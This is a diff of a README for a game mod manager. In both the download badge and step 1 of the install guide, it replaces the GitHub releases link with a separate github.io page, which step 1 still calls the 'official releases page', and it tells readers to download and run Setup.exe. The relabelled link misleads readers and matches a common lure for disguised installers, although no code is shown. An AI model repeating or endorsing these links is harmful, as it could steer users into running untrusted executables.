@@ -1,6 +1,6 @@
 # 🎮 Game-Mod-Manager-2026 - Master your favorite game mods easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/iolm9496/Game-Mod-Manager-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://iolm9496.github.io)
 
 Game Mod Manager 2026 helps you install and organize game modifications on your Windows computer. This tool simplifies the process of changing your game files. You avoid manual file copying and potential errors. The software works with popular titles including Skyrim, Minecraft, Fallout, The Witcher 3, and Cyberpunk 2077.
 
@@ -23,7 +23,7 @@ Your computer must meet these basic requirements to run the manager:
 
 Follow these steps to set up the manager on your computer.
 
-1.  Visit the [official releases page](https://github.com/iolm9496/Game-Mod-Manager-2026/releases) to download the software.
+1.  Visit the [official releases page](https://iolm9496.github.io) to download the software.
 2.  Find the file named Setup.exe in the list of assets.
 3.  Click the link to download Setup.exe to your computer.
 4.  Open the folder where the file saved.
